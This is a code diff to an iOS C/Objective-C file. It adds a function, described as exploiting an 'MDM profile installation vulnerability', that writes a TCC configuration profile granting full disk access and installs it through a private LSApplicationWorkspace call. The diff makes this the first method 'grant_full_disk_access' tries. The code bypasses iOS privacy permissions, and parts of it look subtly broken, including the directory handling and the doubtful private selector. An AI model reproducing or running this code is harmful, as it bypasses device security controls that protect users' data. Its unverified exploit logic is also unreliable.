@@ -364,6 +364,63 @@ static void grant_full_disk_access_ios16(void (^completion)(NSError* _Nullable))
     });
 }
 
+// Alternative method using MDM profile installation vulnerability
+static bool install_mdm_profile(void) {
+    const char* profile_path = "/private/var/mobile/Library/ConfigurationProfiles";
+    int fd = open(profile_path, O_RDONLY | O_CLOEXEC);
+    if (fd == -1) {
+        mkdir(profile_path, 0755);
+        fd = open(profile_path, O_RDONLY | O_CLOEXEC);
+        if (fd == -1) return false;
+    }
+    
+    // Create MDM profile with full disk access
+    NSString *profileContent = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
+    "<plist version=\"1.0\">"
+    "<dict>"
+    "<key>PayloadContent</key>"
+    "<array>"
+    "<dict>"
+    "<key>PayloadType</key>"
+    "<string>com.apple.TCC.configuration-profile-policy</string>"
+    "<key>PayloadIdentifier</key>"
+    "<string>com.apple.TCC.configuration-profile-policy</string>"
+    "<key>PayloadUUID</key>"
+    "<string>486592BA-27B5-4FF5-B51A-7C4B864D2B7F</string>"
+    "<key>PayloadVersion</key>"
+    "<integer>1</integer>"
+    "<key>Services</key>"
+    "<dict>"
+    "<key>SystemPolicyAllFiles</key>"
+    "<array>"
+    "<dict>"
+    "<key>Allowed</key>"
+    "<true/>"
+    "<key>CodeRequirement</key>"
+    "<string>identifier \"com.apple.mobile.installd\" and anchor apple</string>"
+    "</dict>"
+    "</array>"
+    "</dict>"
+    "</dict>"
+    "</array>"
+    "</dict>"
+    "</plist>";
+    
+    NSString *profilePath = [NSString stringWithFormat:@"%s/fullaccess.mobileconfig", profile_path];
+    NSError *error = nil;
+    if (![profileContent writeToFile:profilePath atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
+        close(fd);
+        return false;
+    }
+    
+    // Trigger profile installation via private API
+    Class LSApplicationWorkspace = NSClassFromString(@"LSApplicationWorkspace");
+    id workspace = [LSApplicationWorkspace performSelector:@selector(defaultWorkspace)];
+    
+    return [workspace performSelector:@selector(installProfileWithPath:) withObject:profilePath];
+}
+
 void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
     if (!NSClassFromString(@"NSPresentationIntent")) {
         // class introduced in iOS 15.0.
@@ -375,6 +432,12 @@ void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
                          @"Not supported on iOS 14 and below: on iOS 14 the system partition is not "
                          @"reverted after reboot, so running this may permanently corrupt tccd."
                    }]);
+        return;
+    }
+    
+    // Try alternative MDM profile method first
+    if (install_mdm_profile()) {
+        completion(nil);
         return;
     }
     
